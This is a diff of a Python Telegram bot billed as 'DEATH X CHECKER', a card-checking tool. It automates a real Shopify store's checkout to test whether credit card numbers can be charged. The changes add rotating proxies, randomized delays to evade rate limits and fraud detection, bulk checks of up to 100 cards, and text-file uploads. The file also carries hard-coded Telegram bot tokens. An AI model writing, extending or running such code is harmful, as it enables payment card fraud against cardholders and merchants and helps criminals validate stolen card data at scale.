@@ -9,13 +9,13 @@ import string
 import io
 
 # Your Telegram Bot Token
-BOT_TOKEN = '8496190034:AAEdkiyzyl_najuaVKajbncCHw9W69P3j7g'  # Replace with your bot token
+BOT_TOKEN = '8231183143:AAGkgrQWS_hKvLSRhzrafUk8b7uY-Clay-o'  # Replace with your bot token
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # --- PROXY CONFIGURATION ---
-# Global variable to hold the current proxy configuration
-current_proxy = None
+# Global list to hold multiple proxies for rotation
+proxy_list = []
 # -------------------------
 
 def find_between(s, first, last):
@@ -26,15 +26,16 @@ def find_between(s, first, last):
     except ValueError:
         return ""
 
+def get_random_proxy():
+    """Selects a random proxy from the global list."""
+    if proxy_list:
+        return random.choice(proxy_list)
+    return None
+
 first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
 last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]
 
 def sh(card_details, username):
-    # Make the global proxy variable available in this function
-    global current_proxy
-
-  
-    
     start_time = time.time()
     text = card_details.strip()
     pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
@@ -68,14 +69,7 @@ def sh(card_details, username):
     
     session = requests.Session()
 
-    # --- APPLY PROXY ---
-    # If a proxy is set, apply it to the session.
-    # All requests made with this session will now use the proxy.
-    if current_proxy:
-        session.proxies = current_proxy
-    # -------------------
-
-    # Step 1: Add to cart
+    # --- Step 1: Add to cart ---
     url = "https://violettefieldthreads.com/cart/add.js"
     headers = {
         'authority': 'https://violettefieldthreads.com',
@@ -100,10 +94,11 @@ def sh(card_details, username):
         'product-id': '4638068113473',
         'section-id': 'template--17268456718401__main',
     }
-    response = session.post(url, headers=headers, data=data)
+    response = session.post(url, headers=headers, data=data, proxies=get_random_proxy())
     if response.status_code != 200:
-        return "failed"
-            
+        return f"Failed at step 1: Add to cart. Status: {response.status_code}"
+    
+    # --- Step 2: Get cart details ---
     headers = {
         'authority': 'https://violettefieldthreads.com',
         'accept': '*/*',
@@ -117,14 +112,15 @@ def sh(card_details, username):
         'sec-fetch-site': 'same-origin',
         'user-agent': user_agent,
     }
-    response = session.get('https://violettefieldthreads.com/cart.js', headers=headers)
+    response = session.get('https://violettefieldthreads.com/cart.js', headers=headers, proxies=get_random_proxy())
     raw = response.text
     try:
         res_json = json.loads(raw)
         tok = (res_json['token'])
     except json.JSONDecodeError:
-        print("Response is not valid JSON")
-            
+        return "Failed at step 2: Could not decode cart JSON"
+    
+    # --- Step 3: Proceed to checkout page ---
     headers = {
         'authority': 'https://violettefieldthreads.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -147,14 +143,17 @@ def sh(card_details, username):
         'https://violettefieldthreads.com/cart',
         headers=headers,
         data=data,
-        allow_redirects=True
+        allow_redirects=True,
+        proxies=get_random_proxy()
     )
     text = response.text
     x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
     queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
     stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
     paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
-    
+
+    # --- Step 4: Get payment session ID from Shopify PCI ---
+    time.sleep(random.uniform(1.0, 2.0))
     headers = {
         'authority': 'checkout.pci.shopifyinc.com',
         'accept': 'application/json',
@@ -179,12 +178,14 @@ def sh(card_details, username):
         },
         'payment_session_scope': 'violettefieldthreads.com',
     }
-    response = session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data)
+    response = session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, proxies=get_random_proxy())
     try:
         sid = (response.json())['id']
-    except:
-        return "No token"
+    except (json.JSONDecodeError, KeyError):
+        return "Failed at step 4: Could not get payment session ID"
 
+    # --- Step 5: Submit payment for completion ---
+    time.sleep(random.uniform(1.0, 1.0))
     headers = {
         'authority': 'https://violettefieldthreads.com',
         'accept': 'application/json',
@@ -423,15 +424,17 @@ def sh(card_details, username):
         params=params,
         headers=headers,
         json=json_data,
+        proxies=get_random_proxy()
     )
     raw = response.text
     try:
         res_json = json.loads(raw)
         rid = (res_json['data']['submitForCompletion']['receipt']['id'])
             
-    except json.JSONDecodeError:
-        print("Response is not valid JSON")
+    except (json.JSONDecodeError, KeyError, TypeError):
+        return f"Failed at step 5: Could not get receipt ID. Response: {raw[:200]}"
             
+    # --- Step 6: Poll for the final receipt status ---
     headers = {
         'authority': 'https://violettefieldthreads.com',
         'accept': 'application/json',
@@ -466,7 +469,11 @@ def sh(card_details, username):
     # Loop for polling the result
     max_retries = 10
     for _ in range(max_retries):
-        final_response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data)
+        final_response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql', 
+                                      params=params, 
+                                      headers=headers, 
+                                      json=json_data, 
+                                      proxies=get_random_proxy())
         final_text = final_response.text
         
         if "thank" in final_text.lower() or '"__typename":"ProcessedReceipt"' in final_text:
@@ -478,10 +485,9 @@ def sh(card_details, username):
             resp_msg = "3D_SECURE_REQUIRED"
             break
         elif "processingreceipt" in final_text.lower():
-            time.sleep(5) # Increased sleep to mitigate rate limiting
+            time.sleep(1) 
             continue
         else:
-            # Try to find a specific error code
             error_code = find_between(final_text, '"code":"', '"').lower()
             if "fraud" in error_code:
                 resp_msg = "FRAUD_SUSPECTED"
@@ -489,7 +495,7 @@ def sh(card_details, username):
                 resp_msg = "INSUFFICIENT_FUNDS"
             else:
                 resp_msg = "CARD_DECLINED"
-            break # Exit loop on definitive decline
+            break
             
     elapsed_time = time.time() - start_time
     print(f"Check completed in {elapsed_time:.2f}s with status: {resp_msg}")
@@ -500,26 +506,29 @@ def sh(card_details, username):
     }
     return result
 
+# --- Bot Command Handlers ---
+
 @bot.message_handler(commands=['start'])
 def start(message):
     start_text = """DEATH X CHECKER
 
-AVAILABLE COMMANDS
-━━━━━━━━━━━━━
-/chk - for single check
-/mass - for multiple checks
-/addproxy - to add proxy
-/removeproxy - to remove proxy
-━━━━━━━━━━━━━
-Other:
-/sort to filter cards
+**How to use:**
+- Send cards directly in a message.
+- Upload a `.txt` file with one card per line.
 
-Note - Adding Proxy Gives best Results. 
+**Available Commands:**
+━━━━━━━━━━━━━
+`/chk card` - for single check
+`/mass cards` - for multiple checks
+`/addproxy ip:port:user:pass`
+`/removeproxies` - clear all proxies
+`/myproxies` - view current proxies
+`/sort cards` - to format and remove duplicates
 ━━━━━━━━━━━━━
 GATE - 2$ SHOPIFY
 [⌥] Dev: D E A T H - 👑
-━━━━━━━━━━━━━"""
-    bot.reply_to(message, start_text)
+"""
+    bot.reply_to(message, start_text, parse_mode='Markdown')
 
 @bot.message_handler(commands=['sort'])
 def sort_cards(message):
@@ -530,41 +539,28 @@ def sort_cards(message):
             return
             
         text_to_sort = args[1]
-        
-        # A robust pattern to find various card formats
         pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
-        
         found_cards = re.findall(pattern, text_to_sort)
         
         if not found_cards:
             bot.reply_to(message, "No valid cards found in the provided text.")
             return
             
-        # Use a set to automatically handle and remove duplicate cards
         unique_formatted_cards = set()
-        
         for card_tuple in found_cards:
             card_num, month, year_raw, cvv = card_tuple
             
-            # Normalize the year to YY format
             if len(year_raw) == 4 and year_raw.startswith("20"):
                 year = year_raw[2:]
             else:
-                # Pad with zero if needed and take the last two digits
                 year = year_raw.zfill(2)[-2:]
             
-            # Normalize the month to MM format
             month_formatted = month.zfill(2)
-
-            # Create the final standardized card string
             formatted_card = f"{card_num}|{month_formatted}|{year}|{cvv}"
             unique_formatted_cards.add(formatted_card)
             
-        # Join the unique cards into a single string, with each card on a new line
-        # Sorting the list provides a consistent and clean output
         output_text = "\n".join(sorted(list(unique_formatted_cards)))
         
-        # Send the result in a monospace code block for better readability
         if output_text:
             bot.reply_to(message, f"```\n{output_text}\n```", parse_mode='Markdown')
         else:
@@ -604,152 +600,150 @@ def check_card(message):
         bot.edit_message_text(response_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
     except Exception as e:
         print(f"Could not edit message: {e}")
-        bot.reply_to(message, response_text) # Fallback to sending new message
+        bot.reply_to(message, response_text)
+
+# --- NEW: Central function to process a list of cards ---
+def process_card_list(message, cards, username):
+    """
+    Handles the logic for checking a list of cards, used by /mass and file uploads.
+    """
+    if not cards:
+        bot.reply_to(message, "No valid cards found to check.")
+        return
+
+    total_cards = len(cards)
+    if total_cards > 100:
+        bot.reply_to(message, f"Too many cards. Please provide a maximum of 100 cards. You provided {total_cards}.")
+        return
+        
+    bot.reply_to(message, f"⚪️ Starting check... Found {total_cards} cards to process.")
+    
+    for i, card_details in enumerate(cards):
+        result_text = ""
+        try:
+            result = sh(card_details, username)
+
+            if isinstance(result, str): # Handle errors from sh()
+                card_to_display = card_details
+                response_msg = f"Error: {result}"
+            else: # Handle successful or declined checks
+                card_to_display = result['full_card']
+                response_msg = result['resp_msg']
+
+            # Sanitize the card number for the response
+            safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
+            result_text = f"Card: `{safe_card}`\nResponse: *{response_msg}*"
+
+        except Exception as e:
+            print(f"Error processing card {card_details}: {e}")
+            safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
+            result_text = f"Card: `{safe_card}`\nResponse: *Processing Error* ❗️"
+
+        # Send the result for the current card
+        bot.send_message(message.chat.id, result_text, parse_mode='Markdown')
+        # Critical delay to avoid rate-limiting
+        time.sleep(random.uniform(2, 2))
+
+    bot.send_message(message.chat.id, f"✅ Check Completed!\nProcessed all {total_cards} cards.")
+
 
 @bot.message_handler(commands=['mass'])
 def mass_check_cards(message):
+    """Handles the /mass command for checking multiple cards from text."""
     try:
-        # Extract card details from the message text
         args = message.text.split(maxsplit=1)
         if len(args) < 2:
-            bot.reply_to(message, "Invalid format. Use /mass followed by a list of cards.\nExample:\n/mass 5555...|12|25|123\n4444...|01|26|321")
+            bot.reply_to(message, "Invalid format. Use /mass followed by a list of cards.")
             return
             
         card_list_raw = args[1]
-        # Split by newline or space, and filter out empty strings
         cards = [card.strip() for card in re.split(r'[\n\s]+', card_list_raw) if card.strip()]
-
-        if not cards:
-            bot.reply_to(message, "No valid cards found to check.")
-            return
-
-        total_cards = len(cards)
-        if total_cards > 100:
-            bot.reply_to(message, f"Too many cards. Please provide a maximum of 100 cards. You provided {total_cards}.")
-            return
-            
         username = message.from_user.username or "USER"
         
-        # Send initial status message
-        bot.reply_to(message, f"⚪️ Mass Check Started... Found {total_cards} cards to process.")
-        
-        for i, card_details in enumerate(cards):
-            result_text = ""
-            try:
-                result = sh(card_details, username)
-
-                card_to_display = ""
-                response_msg = ""
-                status_emoji = ""
-
-                if isinstance(result, str): # Handle errors from sh()
-                    card_to_display = card_details
-                    response_msg = f"Error: {result}"
-                    status_emoji = "❗️"
-                elif result['status'] == "Charged🔥":
-                    card_to_display = result['full_card']
-                    response_msg = result['resp_msg']
-                    status_emoji = "🔥"
-                else: # Declined
-                    card_to_display = result['full_card']
-                    response_msg = result['resp_msg']
-                    status_emoji = "❌"
-
-                # Sanitize the card number to prevent Markdown errors
-                safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
-
-                result_text = (
-                    f"Card #{i + 1}/{total_cards}\n"
-                    f"━━━━━━━━━━━━━\n"
-                    f"Card: `{safe_card}`\n"
-                    f"Response: *{response_msg}* {status_emoji}\n"
-                    f"━━━━━━━━━━━━━"
-                )
-
-            except Exception as e:
-                print(f"Error processing card {card_details}: {e}")
-                safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
-                result_text = (
-                    f"Card #{i + 1}/{total_cards}\n"
-                    f"━━━━━━━━━━━━━\n"
-                    f"Card: `{safe_card}`\n"
-                    f"Response: *Processing Error* ❗️\n"
-                    f"━━━━━━━━━━━━━"
-                )
-
-            # Send the result for the current card
-            bot.send_message(message.chat.id, result_text, parse_mode='Markdown')
-
-            # Critical delay to avoid rate-limiting
-            time.sleep(random.uniform(4, 5))
-
-        # Send final completion message
-        bot.send_message(message.chat.id, f"✅ Mass Check Completed!\nChecked all {total_cards} cards.")
+        # Call the central processing function
+        process_card_list(message, cards, username)
 
     except Exception as e:
         print(f"An unexpected error occurred in /mass command: {e}")
         bot.reply_to(message, "An unexpected error occurred. Please check the logs.")
 
-# --- NEW PROXY COMMANDS ---
+# --- NEW: Handler for .txt document uploads ---
+@bot.message_handler(content_types=['document'])
+def handle_document_upload(message):
+    """Handles checking cards from an uploaded .txt file."""
+    try:
+        doc = message.document
+        if not doc.file_name.lower().endswith('.txt'):
+            bot.reply_to(message, "❌ Invalid file type. Please upload a `.txt` file.")
+            return
+
+        file_info = bot.get_file(doc.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        # Decode the file content and split into lines
+        file_content = downloaded_file.decode('utf-8', errors='ignore')
+        cards = [line.strip() for line in file_content.splitlines() if line.strip()]
+        username = message.from_user.username or "USER"
+
+        # Call the central processing function
+        process_card_list(message, cards, username)
+
+    except Exception as e:
+        print(f"Error handling document: {e}")
+        bot.reply_to(message, "An error occurred while processing the file.")
+
+
+# --- PROXY COMMANDS (MODIFIED FOR LIST) ---
 
 @bot.message_handler(commands=['addproxy'])
 def add_proxy(message):
-    """Handles the /addproxy command to set a new proxy."""
-    global current_proxy
+    """Adds a proxy to the rotating list."""
+    global proxy_list
     try:
         proxy_string = message.text.split(maxsplit=1)[1]
         
-        # Support for clearing the proxy
-        if proxy_string.lower() == 'off':
-            current_proxy = None
-            bot.reply_to(message, "✅ Proxy has been removed.")
-            return
-
         parts = proxy_string.split(':')
         if len(parts) != 4:
             bot.reply_to(message, "❌ Invalid proxy format.\nPlease use: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
             return
 
         ip, port, user, password = parts
-        
-        # Format for requests library
         proxy_url = f"http://{user}:{password}@{ip}:{port}"
         
-        current_proxy = {
+        new_proxy = {
             "http": proxy_url,
             "https": proxy_url
         }
         
-        bot.reply_to(message, f"✅ Proxy set successfully!\nHost: `{ip}:{port}`", parse_mode='Markdown')
+        proxy_list.append(new_proxy)
+        bot.reply_to(message, f"✅ Proxy added successfully! Total proxies: {len(proxy_list)}", parse_mode='Markdown')
 
     except IndexError:
         bot.reply_to(message, "❌ Please provide a proxy.\nUsage: `/addproxy ip:port:user:pass`", parse_mode='Markdown')
     except Exception as e:
-        bot.reply_to(message, f"An error occurred while setting the proxy: {e}")
+        bot.reply_to(message, f"An error occurred while adding the proxy: {e}")
 
-@bot.message_handler(commands=['removeproxy'])
-def remove_proxy(message):
-    """Handles the /removeproxy command to clear the current proxy."""
-    global current_proxy
-    current_proxy = None
-    bot.reply_to(message, "✅ Proxy has been successfully removed.")
+@bot.message_handler(commands=['removeproxies'])
+def remove_proxies(message):
+    """Clears the entire proxy list."""
+    global proxy_list
+    proxy_list.clear()
+    bot.reply_to(message, "✅ All proxies have been successfully removed.")
 
-@bot.message_handler(commands=['myproxy'])
-def my_proxy(message):
-    """Checks and displays the current proxy being used."""
-    if current_proxy:
-        # Extract host from the proxy URL for display
-        host = current_proxy['http'].split('@')[-1]
-        bot.reply_to(message, f"ℹ️ Current Proxy: `{host}`", parse_mode='Markdown')
+@bot.message_handler(commands=['myproxies'])
+def my_proxies(message):
+    """Displays the list of currently set proxies."""
+    if proxy_list:
+        hosts = [p['http'].split('@')[-1] for p in proxy_list]
+        proxy_info = "\n".join([f"- `{host}`" for host in hosts])
+        bot.reply_to(message, f"ℹ️ Current Proxies ({len(proxy_list)}):\n{proxy_info}", parse_mode='Markdown')
     else:
-        bot.reply_to(message, "ℹ️ No proxy is currently set.")
+        bot.reply_to(message, "ℹ️ No proxies are currently set.")
 
 # --------------------------
 
-# Start the bot
 if __name__ == '__main__':
     print("Bot is running...")
-    # Use a try-except block to catch exceptions during polling
     try:
         bot.polling(none_stop=True)
     except Exception as e:
